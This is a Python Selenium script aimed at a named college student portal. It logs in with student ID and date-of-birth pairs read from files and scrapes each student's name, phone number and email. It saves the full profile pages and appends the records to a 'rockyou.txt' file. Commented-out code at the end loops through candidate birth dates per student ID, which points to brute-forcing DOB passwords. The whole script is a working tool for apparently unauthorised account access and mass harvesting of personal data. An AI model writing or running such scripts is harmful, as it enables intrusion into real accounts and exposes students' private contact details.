from selenium import webdriver
import time
from threading import *
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

def scrape(usn,dob,htmlfilepath,scraped_path):

    options= webdriver.ChromeOptions()
    options.add_argument('--headless')
    options.add_argument('window-size=1920x1080')
    options.headless=True
     
    driver=webdriver.Chrome(options=options)
    driver.implicitly_wait(5)
    driver.get('https://global.contineo.in/sims/')
    time.sleep(2)

    try:
        usnbox = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.XPATH, '//*[@id="myInput"]'))
        )
        # usnbox=driver.find_element('xpath','//*[@id="myInput"]') 
        usnbox.send_keys(usn)
        

        dob_box = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.XPATH, '//*[@id="mypass"]'))
        )
        # dob_box=driver.find_element('xpath','//*[@id="mypass"]')  
        dob_box.send_keys(dob)


        loginbutton = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.XPATH, '//*[@id="form-login"]/div[3]/div[1]/span[3]/button'))
        )
        # loginbutton=driver.find_element('xpath','//*[@id="form-login"]/div[3]/div[1]/span[3]/button')
        loginbutton.click()
        time.sleep(2)

        if(driver.current_url=='https://global.contineo.in/sims/index.php?option=com_feedback&controller=feedbackentry&task=feedback'):
            click_profile=driver.find_element('xpath','//*[@id="page-header"]/table/tbody/tr/td[2]/ul/li[2]/a')
            click_profile.click()

            # name=driver.find_element('xpath','//*[@id="left-column"]/table/tbody/tr[5]/td/table/tbody/tr[2]/td[1]/table/tbody/tr[2]/td[5]').text
            name_element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.XPATH, '//*[@id="left-column"]/table/tbody/tr[5]/td/table/tbody/tr[2]/td[1]/table/tbody/tr[2]/td[5]'))
            )

            name=name_element.text
            # phone_number=driver.find_element('xpath', '//*[@id="formCore"]/table/tbody/tr[3]/td[2]/table/tbody/tr[2]/td[4]/table/tbody/tr[26]/td[3]/div[2]/span').text
            phone_number_element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.XPATH, '//*[@id="formCore"]/table/tbody/tr[3]/td[2]/table/tbody/tr[2]/td[4]/table/tbody/tr[26]/td[3]/div[2]/span'))
            )
            phone_number_before=phone_number_element.text
            if phone_number_before[0:3]=='+91':
                phone_number=phone_number_before[3:]
            else:
                phone_number=phone_number_before


            # email=driver.find_element ('xpath', '//*[@id="formCore"]/table/tbody/tr[3]/td[2]/table/tbody/tr[2]/td[2]/table/tbody/tr[33]/td[3]/div[2]/span').text
            email_element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.XPATH, '//*[@id="formCore"]/table/tbody/tr[3]/td[2]/table/tbody/tr[2]/td[2]/table/tbody/tr[33]/td[3]/div[2]/span'))
            )
            email=email_element.text
            
            
            profilebutton=driver.find_element('xpath','//*[@id="page-header"]/table/tbody/tr/td[2]/ul/li[2]/a')
            profilebutton.click()

            with open(scraped_path,'a+') as f:
                f.write(usn+' '*5 + dob +' '*5 + phone_number + ' '*5 + name + ' '*5 + email + '\n' )

            with open('rockyou.txt','a+') as f:
                f.write(usn+' '*5 + dob +' '*5 + phone_number + ' '*5 + name + ' '*5 + email + '\n' )

            with open( htmlfilepath+ '/' + usn+'  ' + name + ".html", "w+") as f:
                f.write(driver.page_source)

            with open('success.txt','a+') as f:
                f.write(usn+'\n')
            

            print(usn, dob ,name,phone_number,email,'',sep='\n')
            # print(name,phone_number,email,sep='\n')
        else:
            with open( "invalid.txt", "a+") as f:
                f.write(usn + ' '+ dob+'\n')
            print('invalid due to a conditional')
    except:
        with open( "invalid.txt", "a+") as f:
                f.write(usn + ' '+ dob+'\n')

        print('invalid due to an exception')
        





dept=['AD','AE','AI','AM','CS','CV','EC','EE','IS','ME']
year=['19','20','21','22']
threadlist=[]

with open('success.txt','r') as f:
    done=f.read()
for d in dept:
    for y in year:
        scraped_path='TEXTFILES LOG/'+d + '/' + y + '/scrape.txt'
        htmlfilepath='TEXTFILES LOG/'+d + '/' + y +'/HTML'
        path='TEXTFILES LOG/'+d + '/' + y + '/TOTAL TEXT FILE NO NULL.txt'
        f=open(path)
        usnlist=f.readlines()
        usnlistchunks=[usnlist[x:x+15] for x in range(0,len(usnlist),15)]

        for small_chunks in  usnlistchunks:
            for i in small_chunks:
                value=i.split(' ')
                if value[0] in done:
                    continue
                threads=Thread(target=scrape(value[0].strip(' '), value[1].strip(' \n'), htmlfilepath,scraped_path))
                threads.start()
                threadlist.append(threads)
            for thread in threadlist:
                thread.join()
            print('thread list complete')

            # scrape(value[0].strip(' '),value[1].strip(' \n'), htmlfilepath)









# date_list_chunks = [date_list[x:x+100] for x in range(0, len(date_list), 100)]

# for usn_block in usn_list:
#     for usn in usn_block:    
#         if(continous_invalid>3):
#             print('end of this list')
#             break
#         path='Pthon scraper /TEXTFILES/'+usn[5:7]+'/21/'+str(usn)+'.txt'
#         Found=False
#         if(os.path.exists(path)):
#             continue
#         for small_chunks in date_list_chunks:
#             for dob in small_chunks:
#                 threads=Thread(target=run_test_on,args=(usn,dob))
#                 threads.start()
#                 threadlist.append(threads)
#             for thread in threadlist:
#                 thread.join()
        
#             print('thread list complete')
#             threadlist=[]
#         print('all combinations checked')
#         if(not os.path.exists(path)):
#             with open(path,'w+') as answer_file:
#                 answer_file.write(str(usn)+' '+'null')
#                 continous_invalid+=1
#                 file=open('notvalid.txt','a+')
#                 file.write(str(usn)+'\n')

# os.system('poweroff')